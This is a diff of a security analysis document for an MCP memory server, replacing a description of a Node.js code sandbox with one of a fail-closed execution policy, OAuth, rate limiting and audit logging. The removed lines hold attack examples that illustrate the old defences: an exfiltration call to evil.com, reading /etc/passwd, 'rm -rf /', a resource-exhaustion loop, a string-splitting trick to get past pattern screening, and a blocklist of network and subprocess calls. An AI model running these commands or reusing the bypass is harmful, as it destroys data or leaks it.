@@ -1,312 +1,177 @@
-# Security Analysis: Memory MCP Code Sandbox
+# Security Analysis: Memory MCP Server
 
 ## Overview
 
-This document provides a comprehensive security analysis of the Memory MCP code execution sandbox. The sandbox is designed to execute potentially untrusted TypeScript/JavaScript code with multiple layers of protection.
+This document describes the security posture of the `do-memory-mcp` server as
+it exists today. It is a security analysis of the **live** boundaries —
+transport, authentication, authorization, rate limiting, audit logging,
+input validation, and the fail-closed code-execution policy — not of a removed
+sandbox.
+
+> **Code execution is fail-closed.** `execute_agent_code` is unavailable in
+> production: it is not advertised by `tools/list`, direct calls are rejected,
+> and there is no WASM/Wasmtime/Javy execution backend. See
+> [ADR-073](../plans/adr/ADR-073-Capability-Enforced-Agent-Code-Execution.md)
+> and [ADR-052](../plans/adr/ADR-052-Comprehensive-Analysis-v0.1.29.md).
+> An earlier WASM sandbox was removed in v0.1.29; no production sandbox
+> behavior is promised or implemented.
 
 ## Threat Model
 
 ### Attacker Capabilities
 
 We assume an attacker can:
-- Submit arbitrary JavaScript/TypeScript code for execution
-- Craft code to attempt various escape techniques
-- Use obfuscation to hide malicious intent
-- Attempt resource exhaustion attacks
-- Try to exfiltrate data or execute commands
+
+- Send arbitrary MCP JSON-RPC requests to the server's transport.
+- Attempt to invoke tools with malformed, oversized, or hostile arguments.
+- Attempt to invoke `execute_agent_code` or other unavailable tools.
+- Attempt to exhaust CPU, memory, or storage through query/ingest pressure.
+- Attempt to inject SQL or otherwise tamper with storage queries.
+- Attempt to exfiltrate secrets through logs or tool responses.
 
 ### Assets to Protect
 
-1. **Host System**: Files, processes, network
-2. **Other Executions**: Isolation between concurrent runs
-3. **Confidential Data**: Environment variables, memory contents
-4. **System Resources**: CPU, memory, disk, network
+1. **Stored memory**: episodes, patterns, tags, and relationships.
+2. **Host system**: files, processes, network, and environment.
+3. **Credentials**: OAuth JWKS/secret material and embedding provider keys.
+4. **System resources**: CPU, memory, disk, and network bandwidth.
+5. **Audit integrity**: trustworthy, tamper-resistant security event records.
 
-## Security Layers
+## Security Boundaries
 
-### Layer 1: Input Validation
+### 1. Transport
 
-**Purpose**: Prevent malicious code from reaching execution stage
+- The server communicates over **stdio using JSON-RPC 2.0**
+  (`src/bin/memory-mcp-server.rs`). There is no network listener bound by the
+  default binary.
+- Requests are parsed defensively; malformed JSON yields JSON-RPC error
+  responses rather than panics.
 
-**Mechanisms**:
-- Code length limit (100KB)
-- Pattern-based malicious code detection
-- Blocked patterns:
-  - `require('fs')`, `require('http')`, `require('https')`
-  - `require('child_process')`, `exec()`, `spawn()`
-  - `eval()`, `new Function()`
-  - `while(true)`, `for(;;)`
-  - `fetch()`, `WebSocket`, `XMLHttpRequest`
+### 2. Authentication & Authorization (OAuth 2.1, opt-in)
 
-**Limitations**:
-- Pattern matching can be bypassed with obfuscation
-- New attack vectors may not be detected
+- OAuth 2.1 bearer-token validation lives in `src/bin/server_impl/oauth.rs` and
+  is compiled only with the `oauth` feature.
+- Configuration is read from environment variables:
+  `MCP_OAUTH_ENABLED`, `MCP_OAUTH_AUDIENCE`, `MCP_OAUTH_ISSUER`,
+  `MCP_OAUTH_SCOPES`, `MCP_OAUTH_JWKS_URI`, `MCP_OAUTH_TOKEN_SECRET`.
+- When enabled, tokens are validated (JWT signature verification, issuer,
+  audience, and scope checks) and failures produce `WWW-Authenticate`
+  challenges.
+- When the `oauth` feature is disabled, the server logs that OAuth is disabled
+  and continues; deployments that require authentication MUST enable it.
 
-**Mitigations**:
-- Regular updates to pattern list
-- Multiple layers of defense beyond detection
+### 3. Code Execution (fail-closed)
 
-### Layer 2: Process Isolation
+- `execute_agent_code` is **not** a working execution backend. It is absent from
+  tool discovery and direct calls are rejected
+  (`src/bin/server_impl/handlers/call_tool.rs`,
+  `src/bin/server_impl/handlers/batch_execute.rs`).
+- The handler in `src/bin/server_impl/tools/memory_handlers.rs` audit-logs the
+  attempt and returns a "no longer available" error.
+- No WASM, Wasmtime, Javy, or rquickjs dependency or feature exists in this
+  crate; the `wasmtime-backend`, `javy-backend`, and `wasm-rquickjs` names were
+  removed in v0.1.29.
 
-**Purpose**: Contain code execution in separate process
+#### `sandbox-dev` (trusted local experimentation only)
 
-**Mechanisms**:
-- Each execution spawns new Node.js process
-- Process killed on timeout or completion
-- No shared state between executions
-- Restricted global object access
+A legacy Node.js `CodeSandbox` (`src/sandbox/`) remains compiled **only** behind
+the non-default `sandbox-dev` feature. It is **not** a production sandbox and
+MUST NOT receive untrusted input.
 
-**Protections**:
-```javascript
-delete global.process;
-delete global.require;
-delete global.module;
-delete global.__dirname;
-delete global.__filename;
-```
+**Enforced:** execution timeout with `kill_on_drop`, 100 KB code-length cap,
+static regex source screening (filesystem/network/subprocess/malicious), and
+global shadowing/deletion in the generated JavaScript wrapper.
 
-**Limitations**:
-- Node.js may have undiscovered escape techniques
-- Process spawning has overhead (~50ms)
+**Not enforced:** OS-level isolation (`src/sandbox/isolation.rs` exposes
+`apply_isolation`, but the execution path never calls it), memory and CPU
+limits (configuration-only), output sanitization, and runtime capability
+enforcement. Regex screening is heuristic and bypassable via runtime
+obfuscation.
 
-**Mitigations**:
-- Keep Node.js version updated
-- Monitor for security advisories
-- Use `kill_on_drop` to ensure cleanup
+### 4. Rate Limiting
 
-### Layer 3: Timeout Enforcement
+- Token-bucket per-client rate limiting (`src/server/rate_limiter/`) protects the
+  server from DoS. Limits are configurable via `MCP_RATE_LIMIT_*` environment
+  variables (read/write RPS and burst, cleanup interval, stale threshold).
+- Read and write operations are limited separately.
 
-**Purpose**: Prevent infinite loops and resource exhaustion
+### 5. Audit Logging
 
-**Mechanisms**:
-- Tokio timeout wrapper (enforced by Rust runtime)
-- Internal JavaScript timeout (enforced within sandbox)
-- Process killed if timeout exceeded
+- Structured JSON audit logging (`src/server/audit/`) records security-relevant
+  events: authentication, rate-limit violations, security violations,
+  configuration changes, episode deletion, and rejected code-execution attempts.
+- Sensitive fields are recursively redacted by key
+  (`src/server/audit/redaction.rs`); the redaction field list is configurable
+  via `AUDIT_LOG_REDACT_FIELDS`.
+- Configuration is read from `AUDIT_LOG_*` environment variables (enable,
+  destination, file path, rotation, level).
 
-**Configuration**:
-- Default: 5000ms
-- Restrictive: 3000ms
-- Permissive: 10000ms
+### 6. Input Validation & Storage
 
-**Limitations**:
-- Async operations may slightly exceed timeout
-- CPU-bound loops may consume CPU until timeout
+- All database access uses **parameterized SQL** via the Turso/libSQL and redb
+  storage backends; queries are never built by string concatenation.
+- Tool parameters are validated against their schemas, including length and
+  range constraints, before use.
+- Episode and pattern identifiers are validated and malformed IDs rejected
+  consistently across core, MCP, and CLI.
 
-**Mitigations**:
-- Conservative timeout values
-- Process termination guarantees cleanup
-- Pattern detection for obvious infinite loops
+### 7. Data Protection
 
-### Layer 4: Resource Limits
-
-**Purpose**: Prevent resource exhaustion attacks
-
-**Mechanisms**:
-- Memory limit configuration (not enforced)
-- CPU limit configuration (not enforced)
-- Process-level resource controls
-
-**Current Status**: ⚠️ **ADVISORY ONLY**
-
-These limits are documented but not actively enforced. They serve as:
-- Documentation of intended limits
-- Configuration for future enforcement
-- Guidance for deployment
-
-**Recommended Improvements**:
-1. Use cgroups on Linux for hard memory/CPU limits
-2. Integrate with container orchestration for resource control
-3. Add memory monitoring in wrapper code
-
-### Layer 5: Access Controls
-
-**Purpose**: Prevent unauthorized access to system resources
-
-**File System**:
-- Default: Denied (all access attempts blocked)
-- Permissive: Allowed with whitelist
-- Pattern detection at code level
-- Global deletion at runtime
-
-**Network**:
-- Default: Denied (all network modules blocked)
-- Pattern detection for http, https, net, fetch, WebSocket
-- No configuration to enable (not implemented)
-
-**Subprocesses**:
-- Default: Denied (child_process blocked)
-- Pattern detection for exec, spawn, fork
-- No configuration to enable
-
-**Limitations**:
-- Relies on pattern detection
-- New APIs or methods may bypass detection
-
-### Layer 6: Output Sanitization
-
-**Purpose**: Prevent data exfiltration through output
-
-**Mechanisms**:
-- Structured output parsing
-- stdout/stderr capture
-- Error message sanitization
-
-**Current Implementation**:
-```rust
-let stdout = String::from_utf8_lossy(&output.stdout).to_string();
-let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-```
-
-**Limitations**:
-- No active sanitization of output content
-- Sensitive data in output is returned as-is
-
-**Recommended Improvements**:
-1. Scan output for sensitive patterns (API keys, tokens)
-2. Limit output size
-3. Redact known sensitive formats
+- Credentials are read from environment variables and are never persisted or
+  echoed in responses, warnings, errors, or audit fields.
+- Embedding activation is atomic; failed activation leaves the prior provider
+  unchanged.
+- Transport security for external storage (Turso) is handled by TLS at the
+  client layer.
 
 ## Attack Scenarios
 
-### 1. File System Access
+### 1. SQL Injection
 
-**Attack**: Read sensitive files
-```javascript
-const fs = require('fs');
-const data = fs.readFileSync('/etc/passwd', 'utf8');
-console.log(data); // Exfiltrate via output
-```
+**Attack**: Supply crafted episode IDs or filters to alter queries.
 
-**Defense**:
-- Pattern detection blocks `require('fs')`
-- Returns `SecurityViolation` before execution
-- ✅ **PROTECTED**
+**Defense**: Parameterized statements across all backends; identifiers are
+validated. ✅ **MITIGATED**
 
-### 2. Network Exfiltration
+### 2. Unauthorized Tool Use
 
-**Attack**: Send data to external server
-```javascript
-const https = require('https');
-https.get('https://evil.com/exfil?data=' + sensitiveData);
-```
+**Attack**: Invoke `execute_agent_code` or other privileged operations without
+authorization.
 
-**Defense**:
-- Pattern detection blocks `require('https')`
-- Returns `SecurityViolation` before execution
-- ✅ **PROTECTED**
+**Defense**: `execute_agent_code` is rejected fail-closed; when OAuth is
+enabled, tools require a valid bearer token with the appropriate scope.
+✅ **MITIGATED** (with `oauth` enabled for authenticated deployments)
 
-### 3. Command Execution
+### 3. Resource Exhaustion
 
-**Attack**: Execute system commands
-```javascript
-const { exec } = require('child_process');
-exec('rm -rf / --no-preserve-root');
-```
+**Attack**: Flood the server with requests or large payloads.
 
-**Defense**:
-- Pattern detection blocks `require('child_process')`
-- Returns `SecurityViolation` before execution
-- ✅ **PROTECTED**
+**Defense**: Per-client token-bucket rate limiting, input size limits, and
+schema constraints. ⚠️ **PARTIAL** — limit tuning is deployment-specific.
 
-### 4. Resource Exhaustion
+### 4. Secret Leakage via Logs or Responses
 
-**Attack**: Consume all available resources
-```javascript
-const huge = new Array(999999999);
-while(true) { huge.push(new Array(999999)); }
-```
+**Attack**: Cause secrets to be written to logs or returned in tool output.
 
-**Defense**:
-- Timeout kills process after configured time
-- Pattern detection blocks `while(true)`
-- ⚠️ **PARTIALLY PROTECTED** (may consume CPU until timeout)
+**Defense**: Credentials are read from env and never stored or echoed; audit
+metadata is redacted by key. ⚠️ **PARTIAL** — redaction depends on configured
+field names.
 
-### 5. Code Injection via String Manipulation
+### 5. Prompt Injection via Stored Memory
 
-**Attack**: Bypass pattern detection
-```javascript
-const fs = globalThis[('req' + 'uire')]('f' + 's');
-```
+**Attack**: Store adversarial content in episodes that later influences an
+agent.
 
-**Defense**:
-- Global require deleted in wrapper
-- Process isolation limits access
-- ⚠️ **PARTIALLY PROTECTED** (obfuscation may bypass pattern detection)
-
-### 6. Prototype Pollution
-
-**Attack**: Modify object prototypes
-```javascript
-Object.prototype.isAdmin = true;
-Array.prototype.slice = () => ['evil'];
-```
-
-**Defense**:
-- Process isolation prevents cross-execution pollution
-- No persistence between executions
-- ✅ **PROTECTED** (limited to single execution)
-
-### 7. Timing Attacks
-
-**Attack**: Infer information from execution time
-```javascript
-const start = Date.now();
-// Sensitive operation
-const elapsed = Date.now() - start;
-```
-
-**Defense**:
-- No active defense
-- Execution time is exposed in result
-- ❌ **NOT PROTECTED**
-
-**Recommendation**: If timing attacks are a concern, add jitter to execution timing.
-
-## Security Recommendations
-
-### Immediate Actions
-
-1. ✅ **Implemented**: Pattern-based detection
-2. ✅ **Implemented**: Process isolation
-3. ✅ **Implemented**: Timeout enforcement
-4. ✅ **Implemented**: Comprehensive test coverage
-
-### Short-term Improvements
-
-1. **Add VM2 or Isolated-VM**: More robust JavaScript isolation
-2. **Enforce Resource Limits**: Use cgroups or containers
-3. **Output Sanitization**: Scan for sensitive data patterns
-4. **Rate Limiting**: Limit executions per time period
-5. **Audit Logging**: Log all executions with code hash
-
-### Long-term Enhancements
-
-1. **WebAssembly Sandbox**: Consider Deno or wasmtime for better isolation
-2. **Static Analysis**: Add AST parsing for deeper code analysis
-3. **Machine Learning**: Train model to detect malicious patterns
-4. **Hardware Isolation**: Run in separate containers or VMs
-5. **Capability-based Security**: Fine-grained permission system
+**Defense**: Out of scope for the server's authentication boundary; memory
+content is treated as untrusted by clients. ⚠️ **NOT MITIGATED** at the server
+layer — consumers must treat retrieved memory as untrusted data.
 
 ## Deployment Recommendations
 
-### Production Environment
+### Container Hardening
 
-```bash
-# Run in container with resource limits
-docker run --cpus=0.5 --memory=256m \
-  --network=none \
-  --read-only \
-  --security-opt=no-new-privileges \
-  do-memory-mcp-server
-
-# Or use cgroups directly
-cgcreate -g memory,cpu:/sandbox
-cgset -r memory.limit_in_bytes=268435456 sandbox  # 256MB
-cgset -r cpu.cfs_quota_us=50000 sandbox           # 50% CPU
-cgexec -g memory,cpu:sandbox ./do-memory-mcp-server
-```
-
-### Kubernetes Deployment
+Run the server with a non-root user, dropped capabilities, a read-only root
+filesystem, and explicit resource limits:
 
 ```yaml
 apiVersion: v1
@@ -317,7 +182,6 @@ spec:
   securityContext:
     runAsNonRoot: true
     runAsUser: 1000
-    fsGroup: 1000
   containers:
   - name: mcp-server
     image: do-memory-mcp:latest
@@ -325,57 +189,65 @@ spec:
       limits:
         memory: "256Mi"
         cpu: "500m"
-      requests:
-        memory: "128Mi"
-        cpu: "250m"
     securityContext:
       allowPrivilegeEscalation: false
       readOnlyRootFilesystem: true
       capabilities:
-        drop:
-        - ALL
+        drop: ["ALL"]
 ```
+
+Because there is no in-process sandbox for arbitrary code, resource limits are
+enforced by the deployment substrate (cgroups, container limits), not by the
+MCP server.
+
+### Configuration
+
+- Enable OAuth (`oauth` feature + `MCP_OAUTH_*`) for any shared deployment.
+- Keep rate limiting enabled and tuned (`MCP_RATE_LIMIT_*`).
+- Enable audit logging to a durable, access-controlled destination
+  (`AUDIT_LOG_*`) and set `AUDIT_LOG_REDACT_FIELDS`.
+- Do **not** enable `sandbox-dev` in production.
 
 ## Security Checklist
 
 Before deploying:
 
-- [ ] Update Node.js to latest LTS version
-- [ ] Review and update malicious pattern list
-- [ ] Configure appropriate timeout values
-- [ ] Set up monitoring and alerting
-- [ ] Implement rate limiting
-- [ ] Enable audit logging
-- [ ] Run security penetration tests
-- [ ] Review container/cgroup configuration
-- [ ] Set up network isolation
-- [ ] Configure backup and recovery
+- [ ] OAuth enabled with correct issuer/audience/scopes (if shared)
+- [ ] Rate limiting enabled and tuned
+- [ ] Audit logging enabled with redaction fields configured
+- [ ] Dependencies audited (`cargo audit`)
+- [ ] No hardcoded secrets; credentials via environment variables
+- [ ] TLS configured for Turso connections
+- [ ] Container runs non-root with dropped capabilities and resource limits
+- [ ] `sandbox-dev` feature disabled
+- [ ] Log rotation configured
+- [ ] Incident response plan documented
+- [ ] Backup/recovery tested
 
 ## Incident Response
 
-If security breach suspected:
+If a security breach is suspected:
 
-1. **Immediate**: Stop all code executions
-2. **Isolate**: Quarantine affected systems
-3. **Analyze**: Review logs and execution history
-4. **Patch**: Update sandbox and deploy fixes
-5. **Monitor**: Watch for similar attack patterns
-6. **Report**: Document incident and lessons learned
+1. **Contain**: restrict access to the server and its transports.
+2. **Isolate**: quarantine affected host and storage.
+3. **Analyze**: review audit logs and execution history (respecting redaction).
+4. **Remediate**: patch and redeploy.
+5. **Monitor**: watch for similar patterns.
+6. **Report**: document the incident and lessons learned.
 
 ## Responsible Disclosure
 
-Security vulnerabilities should be reported to:
-- Email: security@example.com
-- GitHub Security Advisory: (create private advisory)
-
-Do NOT create public issues for security vulnerabilities.
+Security vulnerabilities should be reported privately via the repository's
+GitHub Security Advisory workflow. Do NOT create public issues for security
+vulnerabilities.
 
 ## Conclusion
 
-The Memory MCP code sandbox implements multiple layers of security suitable for executing potentially untrusted code. While no sandbox is 100% secure, the defense-in-depth approach significantly reduces attack surface.
+The server's production security posture rests on a stdio-only transport,
+optional OAuth 2.1 authentication, per-client rate limiting, structured and
+redacted audit logging, parameterized storage access, and a **fail-closed**
+code-execution policy. There is no production sandbox for arbitrary agent code;
+deployments that need to run untrusted code must do so in an external,
+separately hardened runner.
 
-**Security Rating**: ⭐⭐⭐⭐☆ (4/5)
-
-**Recommendation**: Suitable for production use with proper deployment configuration and monitoring.
-
-**Last Updated**: 2025-11-06
+**Last Updated**: 2026-09-30
